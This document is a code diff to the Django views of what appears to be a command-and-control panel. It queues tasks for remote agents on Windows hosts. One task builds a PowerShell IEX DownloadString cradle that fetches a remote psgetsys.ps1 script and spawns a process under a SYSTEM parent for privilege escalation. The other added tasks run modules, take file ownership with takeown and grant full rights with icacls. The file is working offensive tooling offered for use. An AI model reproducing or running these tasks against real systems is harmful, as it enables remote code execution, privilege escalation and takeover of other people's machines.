@@ -619,17 +619,17 @@ def tasklist (request):
         return render(request, 'blog/listeners.html')
 
 
-def exploitParentProcess(request):
+def Exec_With_Prnt_Priv(request):
     if request.method=='POST':
         agent = request.POST['agent']
         agentId = request.POST['agentId']
         moduleId = request.POST['moduleId']
         agentTask = AgentTasks(agent_id = agentId , module_id = moduleId)
         agentTask.save()
-        fileURL=request.POST['fileURL']  #the PoCScript "psgetsys.ps1"
+        psgetsysURL=request.POST['psgetsysURL']  #the PoCScript "psgetsys.ps1"
         system_pid = request.POST['system_pid']    
         path_to_execute = request.POST['path_to_execute']
-        task = "IEX(New-Object Net.WebClient).DownloadString('{}');[MyProcess]::CreateProcessFromParent({},'{}','')".format(fileURL,system_pid,path_to_execute)
+        task = "IEX(New-Object Net.WebClient).DownloadString('{}');[MyProcess]::CreateProcessFromParent({},'{}','')".format(psgetsysURL,system_pid,path_to_execute)
         task_path = os.path.normpath(current_path+os.sep+os.pardir+os.sep+os.pardir)+"/data/listeners/agents/{}/tasks".format(agent)
         with open(task_path, "w") as f:
             f.write(task)
@@ -638,5 +638,105 @@ def exploitParentProcess(request):
     else:
         return render(request, 'blog/listeners.html')
 
+
         
+
+def Import_Module (request):
+    if request.method=='POST':
+        agent = request.POST['agent']
+        agentId = request.POST['agentId']
+        moduleId = request.POST['moduleId']
+        agentTask = AgentTasks(agent_id = agentId , module_id = moduleId)
+        agentTask.save()
+
+        Module_Path = request.POST['Module_Path']
+        task = "Import-Module .\{}".format(Module_Path)
+        task_path = os.path.normpath(current_path+os.sep+os.pardir+os.sep+os.pardir)+"/data/listeners/agents/{}/tasks".format(agent)
+        with open(task_path, "w") as f:
+            f.write(task)
+            f.close()
+        return JsonResponse({},status=200)
+    else:
+        return render(request, 'blog/listeners.html')
+
+
+
+
+def Exec_Module (request):
+    if request.method=='POST':
+        agent = request.POST['agent']
+        agentId = request.POST['agentId']
+        moduleId = request.POST['moduleId']
+        agentTask = AgentTasks(agent_id = agentId , module_id = moduleId)
+        agentTask.save()
+
+        Module_Path = request.POST['Module_Path']
+        task = ".\{}".format(Module_Path)
+        task_path = os.path.normpath(current_path+os.sep+os.pardir+os.sep+os.pardir)+"/data/listeners/agents/{}/tasks".format(agent)
+        with open(task_path, "w") as f:
+            f.write(task)
+            f.close()
+        return JsonResponse({},status=200)
+    else:
+        return render(request, 'blog/listeners.html')
+
+def Chk_File_Owner (request):
+
+    if request.method=='POST':
+        agent = request.POST['agent']
+        agentId = request.POST['agentId']
+        moduleId = request.POST['moduleId']
+        agentTask = AgentTasks(agent_id = agentId , module_id = moduleId)
+        agentTask.save()
+
+        FilePath = request.POST['FilePath']
+        task = "cmd /c dir /q '{}'".format(FilePath)
+        task_path = os.path.normpath(current_path+os.sep+os.pardir+os.sep+os.pardir)+"/data/listeners/agents/{}/tasks".format(agent)
+        with open(task_path, "w") as f:
+            f.write(task)
+            f.close()
+        return JsonResponse({},status=200)
+    else:
+        return render(request, 'blog/listeners.html')
+
+
+def Take_Own (request):
+
+    if request.method=='POST':
+        agent = request.POST['agent']
+        agentId = request.POST['agentId']
+        moduleId = request.POST['moduleId']
+        agentTask = AgentTasks(agent_id = agentId , module_id = moduleId)
+        agentTask.save()
+
+        FilePath = request.POST['FilePath']
+        task = "takeown /f '{}'".format(FilePath)
+        task_path = os.path.normpath(current_path+os.sep+os.pardir+os.sep+os.pardir)+"/data/listeners/agents/{}/tasks".format(agent)
+        with open(task_path, "w") as f:
+            f.write(task)
+            f.close()
+        return JsonResponse({},status=200)
+    else:
+        return render(request, 'blog/listeners.html')
+
+
+def ACL_modify (request):
+
+    if request.method=='POST':
+        agent = request.POST['agent']
+        agentId = request.POST['agentId']
+        moduleId = request.POST['moduleId']
+        agentTask = AgentTasks(agent_id = agentId , module_id = moduleId)
+        agentTask.save()
+
+        FilePath = request.POST['FilePath']
+        UserName = request.POST['UserName']
+        task = "icacls '{}' /grant {}:F".format(FilePath,UserName)
+        task_path = os.path.normpath(current_path+os.sep+os.pardir+os.sep+os.pardir)+"/data/listeners/agents/{}/tasks".format(agent)
+        with open(task_path, "w") as f:
+            f.write(task)
+            f.close()
+        return JsonResponse({},status=200)
+    else:
+        return render(request, 'blog/listeners.html')
 
